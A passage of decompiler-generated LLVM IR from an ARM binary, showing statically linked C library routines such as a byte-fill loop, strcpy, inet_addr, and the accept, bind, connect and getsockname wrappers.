  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11c4458, label %dec_label_pc_11c54, label %bb

bb:                                               ; preds = %dec_label_pc_11c3c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11c3c ]
  %v3_11c4859 = phi i32 [ %v6_11c48, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11c3c ]
  %v4_11c48 = inttoptr i32 %v3_11c4859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11c48, align 1
  %v5_11c48 = load i32, i32* @r3, align 4
  %v6_11c48 = add i32 %v5_11c48, 1
  store i32 %v6_11c48, i32* @r3, align 4
  %v0_11c4c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11c58.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_11c4c.pr, label %dec_label_pc_11c54, label %.thread

.thread:                                          ; preds = %bb
  %v2_11c4c = add i32 %v0_11c58.pr.pre, -1
  store i32 %v2_11c4c, i32* %r2.global-to-local, align 4
  %v1_11c44 = urem i32 %v6_11c48, 4
  %v2_11c44 = icmp eq i32 %v1_11c44, 0
  store i1 %v2_11c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c44, label %dec_label_pc_11c54, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11c48.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11c48.pre to i8
  br label %bb

dec_label_pc_11c54:                               ; preds = %.thread, %bb, %dec_label_pc_11c3c
  %v0_11c6028 = phi i32 [ %tmp, %dec_label_pc_11c3c ], [ %v6_11c48, %bb ], [ %v6_11c48, %.thread ]
  %v0_11c58.pr = phi i32 [ %arg3, %dec_label_pc_11c3c ], [ %v0_11c58.pr.pre, %bb ], [ %v2_11c4c, %.thread ]
  %v0_11c54 = load i32, i32* @r1, align 4
  store i32 %v0_11c54, i32* %ip.global-to-local, align 4
  %v8_11c5810 = icmp eq i32 %v0_11c58.pr, 8
  store i1 %v8_11c5810, i1* %cpsr_z.global-to-local, align 1
  %v5_11c5c11 = icmp slt i32 %v0_11c58.pr, 8
  br i1 %v5_11c5c11, label %dec_label_pc_11c98, label %dec_label_pc_11c60.preheader

dec_label_pc_11c60.preheader:                     ; preds = %dec_label_pc_11c54
  %v1_11c6046 = inttoptr i32 %v0_11c6028 to i32*
  store i32 %v0_11c54, i32* %v1_11c6046, align 4
  %v3_11c6047 = add i32 %v0_11c6028, 4
  %v4_11c6048 = inttoptr i32 %v3_11c6047 to i32*
  %v5_11c6049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c6049, i32* %v4_11c6048, align 4
  %v6_11c6050 = add i32 %v0_11c6028, 8
  store i32 %v6_11c6050, i32* @r3, align 4
  %v0_11c6451 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c6452 = add i32 %v0_11c6451, -8
  store i32 %v1_11c6452, i32* %r2.global-to-local, align 4
  %v5_11c6c53 = icmp slt i32 %v1_11c6452, 8
  br i1 %v5_11c6c53, label %dec_label_pc_11c60.dec_label_pc_11c98.loopexit_crit_edge, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c60.preheader, %dec_label_pc_11c58.dec_label_pc_11c60_crit_edge
  %v6_11c6055 = phi i32 [ %v6_11c60, %dec_label_pc_11c58.dec_label_pc_11c60_crit_edge ], [ %v6_11c6050, %dec_label_pc_11c60.preheader ]
  %v0_11c6054 = phi i32 [ %v12_11c8c, %dec_label_pc_11c58.dec_label_pc_11c60_crit_edge ], [ %v0_11c6028, %dec_label_pc_11c60.preheader ]
  %v1_11c70 = inttoptr i32 %v6_11c6055 to i32*
  %v2_11c70 = load i32, i32* @r1, align 4
  store i32 %v2_11c70, i32* %v1_11c70, align 4
  %v3_11c70 = add i32 %v0_11c6054, 12
  %v4_11c70 = inttoptr i32 %v3_11c70 to i32*
  %v5_11c70 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c70, i32* %v4_11c70, align 4
  %v6_11c70 = add i32 %v0_11c6054, 16
  store i32 %v6_11c70, i32* @r3, align 4
  %v0_11c74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c74 = add i32 %v0_11c74, -8
  store i32 %v1_11c74, i32* %r2.global-to-local, align 4
  %v5_11c7c = icmp slt i32 %v1_11c74, 8
  br i1 %v5_11c7c, label %dec_label_pc_11c70.dec_label_pc_11c98.loopexit_crit_edge, label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11c70
  %v1_11c80 = inttoptr i32 %v6_11c70 to i32*
  %v2_11c80 = load i32, i32* @r1, align 4
  store i32 %v2_11c80, i32* %v1_11c80, align 4
  %v3_11c80 = add i32 %v0_11c6054, 20
  %v4_11c80 = inttoptr i32 %v3_11c80 to i32*
  %v5_11c80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c80, i32* %v4_11c80, align 4
  %v6_11c80 = add i32 %v0_11c6054, 24
  store i32 %v6_11c80, i32* @r3, align 4
  %v0_11c84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c84 = add i32 %v0_11c84, -8
  store i32 %v1_11c84, i32* %r2.global-to-local, align 4
  %v5_11c8c = icmp slt i32 %v1_11c84, 8
  br i1 %v5_11c8c, label %dec_label_pc_11c80.dec_label_pc_11c98.loopexit_crit_edge, label %dec_label_pc_11c58

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11c80
  %v7_11c8c = inttoptr i32 %v6_11c80 to i32*
  %v8_11c8c = load i32, i32* @r1, align 4
  store i32 %v8_11c8c, i32* %v7_11c8c, align 4
  %v9_11c8c = add i32 %v0_11c6054, 28
  %v10_11c8c = inttoptr i32 %v9_11c8c to i32*
  %v11_11c8c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_11c8c, i32* %v10_11c8c, align 4
  %v12_11c8c = add i32 %v0_11c6054, 32
  store i32 %v12_11c8c, i32* @r3, align 4
  %v6_11c90 = load i32, i32* %r2.global-to-local, align 4
  %v7_11c90 = add i32 %v6_11c90, -8
  store i32 %v7_11c90, i32* %r2.global-to-local, align 4
  %v5_11c5c = icmp slt i32 %v7_11c90, 8
  br i1 %v5_11c5c, label %dec_label_pc_11c58.dec_label_pc_11c98.loopexit_crit_edge, label %dec_label_pc_11c58.dec_label_pc_11c60_crit_edge

dec_label_pc_11c58.dec_label_pc_11c60_crit_edge:  ; preds = %dec_label_pc_11c58
  %v2_11c60.pre = load i32, i32* @r1, align 4
  %v1_11c60 = inttoptr i32 %v12_11c8c to i32*
  store i32 %v2_11c60.pre, i32* %v1_11c60, align 4
  %v3_11c60 = add i32 %v0_11c6054, 36
  %v4_11c60 = inttoptr i32 %v3_11c60 to i32*
  %v5_11c60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c60, i32* %v4_11c60, align 4
  %v6_11c60 = add i32 %v0_11c6054, 40
  store i32 %v6_11c60, i32* @r3, align 4
  %v0_11c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c64 = add i32 %v0_11c64, -8
  store i32 %v1_11c64, i32* %r2.global-to-local, align 4
  %v5_11c6c = icmp slt i32 %v1_11c64, 8
  br i1 %v5_11c6c, label %dec_label_pc_11c60.dec_label_pc_11c98.loopexit_crit_edge, label %dec_label_pc_11c70

dec_label_pc_11c58.dec_label_pc_11c98.loopexit_crit_edge: ; preds = %dec_label_pc_11c58
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c98

dec_label_pc_11c60.dec_label_pc_11c98.loopexit_crit_edge: ; preds = %dec_label_pc_11c58.dec_label_pc_11c60_crit_edge, %dec_label_pc_11c60.preheader
  %v1_11c64.lcssa = phi i32 [ %v1_11c6452, %dec_label_pc_11c60.preheader ], [ %v1_11c64, %dec_label_pc_11c58.dec_label_pc_11c60_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c98

dec_label_pc_11c70.dec_label_pc_11c98.loopexit_crit_edge: ; preds = %dec_label_pc_11c70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c98

dec_label_pc_11c80.dec_label_pc_11c98.loopexit_crit_edge: ; preds = %dec_label_pc_11c80
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c98

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c54, %dec_label_pc_11c58.dec_label_pc_11c98.loopexit_crit_edge, %dec_label_pc_11c60.dec_label_pc_11c98.loopexit_crit_edge, %dec_label_pc_11c70.dec_label_pc_11c98.loopexit_crit_edge, %dec_label_pc_11c80.dec_label_pc_11c98.loopexit_crit_edge, %entry
  %v0_11ca0 = phi i32 [ %arg3, %entry ], [ %v1_11c84, %dec_label_pc_11c80.dec_label_pc_11c98.loopexit_crit_edge ], [ %v1_11c74, %dec_label_pc_11c70.dec_label_pc_11c98.loopexit_crit_edge ], [ %v1_11c64.lcssa, %dec_label_pc_11c60.dec_label_pc_11c98.loopexit_crit_edge ], [ %v7_11c90, %dec_label_pc_11c58.dec_label_pc_11c98.loopexit_crit_edge ], [ %v0_11c58.pr, %dec_label_pc_11c54 ]
  %v2_11c98 = icmp eq i32 %v0_11ca0, 0
  store i1 %v2_11c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c98, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11c98
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11c98
  %v1_11ca0 = sub i32 7, %v0_11ca0
  store i32 %v1_11ca0, i32* %r2.global-to-local, align 4
  %v3_11ca4 = mul i32 %v1_11ca0, 4
  %v4_11ca4 = add i32 %v3_11ca4, ptrtoint (i32* @global_var_11cac.401 to i32)
  call void @__pseudo_branch(i32 %v4_11ca4)
  %v0_11cac = load i32, i32* @r1, align 4
  %v1_11cac = trunc i32 %v0_11cac to i8
  %v2_11cac = load i32, i32* @r3, align 4
  %v3_11cac = inttoptr i32 %v2_11cac to i8*
  store i8 %v1_11cac, i8* %v3_11cac, align 1
  %v4_11cac = load i32, i32* @r3, align 4
  %v5_11cac = add i32 %v4_11cac, 1
  store i32 %v5_11cac, i32* %r3.global-to-local, align 4
  %v0_11cb0 = load i32, i32* @r1, align 4
  %v1_11cb0 = trunc i32 %v0_11cb0 to i8
  %v3_11cb0 = inttoptr i32 %v5_11cac to i8*
  store i8 %v1_11cb0, i8* %v3_11cb0, align 1
  %v4_11cb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cb0 = add i32 %v4_11cb0, 1
  store i32 %v5_11cb0, i32* %r3.global-to-local, align 4
  %v0_11cb4 = load i32, i32* @r1, align 4
  %v1_11cb4 = trunc i32 %v0_11cb4 to i8
  %v3_11cb4 = inttoptr i32 %v5_11cb0 to i8*
  store i8 %v1_11cb4, i8* %v3_11cb4, align 1
  %v4_11cb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cb4 = add i32 %v4_11cb4, 1
  store i32 %v5_11cb4, i32* %r3.global-to-local, align 4
  %v0_11cb8 = load i32, i32* @r1, align 4
  %v1_11cb8 = trunc i32 %v0_11cb8 to i8
  %v3_11cb8 = inttoptr i32 %v5_11cb4 to i8*
  store i8 %v1_11cb8, i8* %v3_11cb8, align 1
  %v4_11cb8 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cb8 = add i32 %v4_11cb8, 1
  store i32 %v5_11cb8, i32* %r3.global-to-local, align 4
  %v0_11cbc = load i32, i32* @r1, align 4
  %v1_11cbc = trunc i32 %v0_11cbc to i8
  %v3_11cbc = inttoptr i32 %v5_11cb8 to i8*
  store i8 %v1_11cbc, i8* %v3_11cbc, align 1
  %v4_11cbc = load i32, i32* %r3.global-to-local, align 4
  %v5_11cbc = add i32 %v4_11cbc, 1
  store i32 %v5_11cbc, i32* %r3.global-to-local, align 4
  %v0_11cc0 = load i32, i32* @r1, align 4
  %v1_11cc0 = trunc i32 %v0_11cc0 to i8
  %v3_11cc0 = inttoptr i32 %v5_11cbc to i8*
  store i8 %v1_11cc0, i8* %v3_11cc0, align 1
  %v4_11cc0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cc0 = add i32 %v4_11cc0, 1
  store i32 %v5_11cc0, i32* %r3.global-to-local, align 4
  %v0_11cc4 = load i32, i32* @r1, align 4
  %v1_11cc4 = trunc i32 %v0_11cc4 to i8
  %v3_11cc4 = inttoptr i32 %v5_11cc0 to i8*
  store i8 %v1_11cc4, i8* %v3_11cc4, align 1
  %v4_11cc4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cc4 = add i32 %v4_11cc4, 1
  store i32 %v5_11cc4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11c60, { 1, 0 }
  uselistorder i32 %v12_11c8c, { 1, 2, 0 }
  uselistorder i32 %v0_11c6054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11c58.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11c48, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11c3c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11c98, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11c70, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11ce01 = load i32, i32* @r1, align 4
  %v1_11ce02 = inttoptr i32 %v0_11ce01 to i8*
  %v2_11ce03 = load i8, i8* %v1_11ce02, align 1
  %v2_11ce45 = icmp eq i8 %v2_11ce03, 0
  store i1 %v2_11ce45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11ce03, i8* %arg1, align 1
  br i1 %v2_11ce45, label %dec_label_pc_11cf0, label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %entry, %dec_label_pc_11cd8
  %v0_11cd8 = load i32, i32* @r1, align 4
  %v1_11cd8 = add i32 %v0_11cd8, 1
  store i32 %v1_11cd8, i32* @r1, align 4
  %v0_11cdc = load i32, i32* %r2.global-to-local, align 4
  %v1_11cdc = add i32 %v0_11cdc, 1
  store i32 %v1_11cdc, i32* %r2.global-to-local, align 4
  %v1_11ce0 = inttoptr i32 %v1_11cd8 to i8*
  %v2_11ce0 = load i8, i8* %v1_11ce0, align 1
  %v2_11ce4 = icmp eq i8 %v2_11ce0, 0
  store i1 %v2_11ce4, i1* %cpsr_z.global-to-local, align 1
  %v3_11ce8 = inttoptr i32 %v1_11cdc to i8*
  store i8 %v2_11ce0, i8* %v3_11ce8, align 1
  %v0_11cec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11cec, label %dec_label_pc_11cf0, label %dec_label_pc_11cd8

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11cd8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11cd8, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_11cfc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_11cfc, i32* @r1, align 4
  %v0_11d00 = call i32 @inet_aton()
  %v2_11d04 = icmp eq i32 %v0_11d00, 0
  %v4_11d08 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11d04, i32 -1, i32 %v4_11d08
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d1c = load i32, i32* @r7, align 4
  store i32 %v3_11d1c, i32* %stack_var_-8, align 4
  %v0_11d28 = load i32, i32* @r0, align 4
  store i32 %v0_11d28, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d28, -4095
  br i1 %tmp, label %dec_label_pc_11d50, label %dec_label_pc_11d38

dec_label_pc_11d38:                               ; preds = %entry
  %v0_11d3c = call i32 @__aeabi_read_tp()
  %v3_11d40 = load i16, i16* @global_var_22294.357, align 2
  %v4_11d40 = sext i16 %v3_11d40 to i32
  %v0_11d44 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d44 = sub i32 0, %v0_11d44
  store i32 %v1_11d44, i32* %r2.global-to-local, align 4
  %v3_11d48 = add i32 %v4_11d40, %v0_11d3c
  %v4_11d48 = inttoptr i32 %v3_11d48 to i32*
  store i32 %v1_11d44, i32* %v4_11d48, align 4
  %v2_11d50.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d50

dec_label_pc_11d50:                               ; preds = %entry, %dec_label_pc_11d38
  %v1_11d54 = phi i32 [ %v0_11d28, %entry ], [ -1, %dec_label_pc_11d38 ]
  %v2_11d50 = phi i32 [ %v3_11d1c, %entry ], [ %v2_11d50.pre, %dec_label_pc_11d38 ]
  store i32 %v2_11d50, i32* @r7, align 4
  ret i32 %v1_11d54

; uselistorder directives
  uselistorder i32 %v0_11d28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d50, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d58:
  %v0_11d58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11d58
  %v2_11d5c = load i32, i32* @ip, align 4
  %v5_11d5c = sdiv i32 %v2_11d5c, 1024
  %v6_11d5c = and i32 %v5_11d5c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11d58, %bb
  %v7_11d5c = phi i32 [ %arg1, %dec_label_pc_11d58 ], [ %v6_11d5c, %bb ]
  ret i32 %v7_11d5c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11d64 = load i32, i32* @r4, align 4
  %v9_11d64 = load i32, i32* @r6, align 4
  %v12_11d64 = load i32, i32* @r7, align 4
  %v4_11d70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_11d74 = icmp eq i32 %v4_11d70, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11d74, label %dec_label_pc_11d8c, label %entry.dec_label_pc_11d98_crit_edge

entry.dec_label_pc_11d98_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11d98

dec_label_pc_11d8c:                               ; preds = %entry
  store i32 %v3_11d64, i32* @r4, align 4
  store i32 %v9_11d64, i32* @r6, align 4
  store i32 %v12_11d64, i32* @r7, align 4
  %v0_11d94 = call i32 @__sys_accept()
  br label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %entry.dec_label_pc_11d98_crit_edge, %dec_label_pc_11d8c
  %v0_11d98 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11d98, i32* @r5, align 4
  %v0_11da8 = load i32, i32* @r4, align 4
  store i32 %v0_11da8, i32* @r0, align 4
  %v0_11dac = call i32 @__sys_accept()
  store i32 %v0_11dac, i32* @r4, align 4
  %v0_11db4 = load i32, i32* @r5, align 4
  %v1_11db8 = call i32 @__libc_disable_asynccancel(i32 %v0_11db4)
  %v0_11dbc = load i32, i32* @r4, align 4
  store i32 %v12_11d64, i32* @r7, align 4
  ret i32 %v0_11dbc

; uselistorder directives
  uselistorder label %dec_label_pc_11d98, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dd4 = load i32, i32* @r7, align 4
  store i32 %v3_11dd4, i32* %stack_var_-8, align 4
  %v0_11de0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11de0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11de0, -4095
  br i1 %tmp, label %dec_label_pc_11e08, label %dec_label_pc_11df0

dec_label_pc_11df0:                               ; preds = %entry
  %v0_11df4 = call i32 @__aeabi_read_tp()
  %v3_11df8 = load i16, i16* @global_var_22294.357, align 2
  %v4_11df8 = sext i16 %v3_11df8 to i32
  %v0_11dfc = load i32, i32* %r2.global-to-local, align 4
  %v1_11dfc = sub i32 0, %v0_11dfc
  store i32 %v1_11dfc, i32* %r2.global-to-local, align 4
  %v3_11e00 = add i32 %v4_11df8, %v0_11df4
  %v4_11e00 = inttoptr i32 %v3_11e00 to i32*
  store i32 %v1_11dfc, i32* %v4_11e00, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11e08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e08

dec_label_pc_11e08:                               ; preds = %entry, %dec_label_pc_11df0
  %v1_11e0c = phi i32 [ %v0_11de0, %entry ], [ -1, %dec_label_pc_11df0 ]
  %v2_11e08 = phi i32 [ %v3_11dd4, %entry ], [ %v2_11e08.pre, %dec_label_pc_11df0 ]
  store i32 %v2_11e08, i32* @r7, align 4
  ret i32 %v1_11e0c

; uselistorder directives
  uselistorder i32 %v0_11de0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11e08, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e10:
  %v0_11e10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e10
  %v2_11e10 = load i32, i32* @sl, align 4
  %v8_11e10 = shl i32 %v2_11e10, %arg2
  %v9_11e10 = and i32 %v8_11e10, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e10, %bb
  %v4_11e14 = phi i32 [ %arg1, %dec_label_pc_11e10 ], [ %v9_11e10, %bb ]
  ret i32 %v4_11e14

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e18 = load i32, i32* @r7, align 4
  store i32 %v3_11e18, i32* %stack_var_-8, align 4
  %v0_11e24 = load i32, i32* @r0, align 4
  store i32 %v0_11e24, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e24, -4095
  br i1 %tmp, label %dec_label_pc_11e4c, label %dec_label_pc_11e34

dec_label_pc_11e34:                               ; preds = %entry
  %v0_11e38 = call i32 @__aeabi_read_tp()
  %v3_11e3c = load i16, i16* @global_var_22294.357, align 2
  %v4_11e3c = sext i16 %v3_11e3c to i32
  store i32 %v4_11e3c, i32* @r3, align 4
  %v0_11e40 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e40 = sub i32 0, %v0_11e40
  store i32 %v1_11e40, i32* %r2.global-to-local, align 4
  %v3_11e44 = add i32 %v4_11e3c, %v0_11e38
  %v4_11e44 = inttoptr i32 %v3_11e44 to i32*
  store i32 %v1_11e40, i32* %v4_11e44, align 4
  %v2_11e4c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %entry, %dec_label_pc_11e34
  %v1_11e50 = phi i32 [ %v0_11e24, %entry ], [ -1, %dec_label_pc_11e34 ]
  %v2_11e4c = phi i32 [ %v3_11e18, %entry ], [ %v2_11e4c.pre, %dec_label_pc_11e34 ]
  store i32 %v2_11e4c, i32* @r7, align 4
  ret i32 %v1_11e50

; uselistorder directives
  uselistorder i32 %v0_11e24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e4c, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e54:
  %v0_11e54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e54
  %v2_11e54 = load i32, i32* @fp, align 4
  %v8_11e54 = shl i32 %v2_11e54, %arg2
  %v9_11e54 = and i32 %v8_11e54, %arg1
  %v3_11e58 = load i32, i32* @r4, align 4
  %v8_11e58 = ashr i32 %v9_11e54, %v3_11e58
  %v9_11e58 = and i32 %v8_11e58, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e54, %bb
  %v10_11e58 = phi i32 [ %arg1, %dec_label_pc_11e54 ], [ %v9_11e58, %bb ]
  ret i32 %v10_11e58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11e60 = load i32, i32* @r4, align 4
  store i32 %v3_11e60, i32* %stack_var_-20, align 4
  %v6_11e60 = load i32, i32* @r5, align 4
  %v9_11e60 = load i32, i32* @r6, align 4
  %v12_11e60 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r3, align 4
  %v4_11e6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  store i32 %v4_11e6c, i32* @ip, align 4
  %v2_11e70 = icmp eq i32 %v4_11e6c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11e70, label %dec_label_pc_11e88, label %entry.dec_label_pc_11e94_crit_edge

entry.dec_label_pc_11e94_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11e94

dec_label_pc_11e88:                               ; preds = %entry
  store i32 %v3_11e60, i32* @r4, align 4
  store i32 %v9_11e60, i32* @r6, align 4
  store i32 %v12_11e60, i32* @r7, align 4
  %v0_11e90 = call i32 @__sys_connect()
  br label %dec_label_pc_11e94

dec_label_pc_11e94:                               ; preds = %entry.dec_label_pc_11e94_crit_edge, %dec_label_pc_11e88
  %v0_11e94 = call i32 @__libc_enable_asynccancel()
  %v0_11e98 = load i32, i32* @r6, align 4
  store i32 %v0_11e98, i32* @r1, align 4
  store i32 %v0_11e94, i32* @r5, align 4
  %v0_11ea4 = load i32, i32* @r4, align 4
  store i32 %v0_11ea4, i32* @r0, align 4
  %v0_11ea8 = call i32 @__sys_connect()
  store i32 %v0_11ea8, i32* @r4, align 4
  %v0_11eb0 = load i32, i32* @r5, align 4
  %v1_11eb4 = call i32 @__libc_disable_asynccancel(i32 %v0_11eb0)
  %v0_11eb8 = load i32, i32* @r4, align 4
  %v2_11ec0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11ec0, i32* @r4, align 4
  store i32 %v6_11e60, i32* @r5, align 4
  store i32 %v9_11e60, i32* @r6, align 4
  store i32 %v12_11e60, i32* @r7, align 4
  ret i32 %v0_11eb8

; uselistorder directives
  uselistorder label %dec_label_pc_11e94, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ed0 = load i32, i32* @r7, align 4
  store i32 %v3_11ed0, i32* %stack_var_-8, align 4
  %v0_11edc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11edc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11edc, -4095
  br i1 %tmp, label %dec_label_pc_11f04, label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %entry
  %v0_11ef0 = call i32 @__aeabi_read_tp()
  %v3_11ef4 = load i16, i16* @global_var_22294.357, align 2
  %v4_11ef4 = sext i16 %v3_11ef4 to i32
  %v0_11ef8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ef8 = sub i32 0, %v0_11ef8
  store i32 %v1_11ef8, i32* %r2.global-to-local, align 4
  %v3_11efc = add i32 %v4_11ef4, %v0_11ef0
  %v4_11efc = inttoptr i32 %v3_11efc to i32*
  store i32 %v1_11ef8, i32* %v4_11efc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f04

dec_label_pc_11f04:                               ; preds = %entry, %dec_label_pc_11eec
  %v1_11f08 = phi i32 [ %v0_11edc, %entry ], [ -1, %dec_label_pc_11eec ]
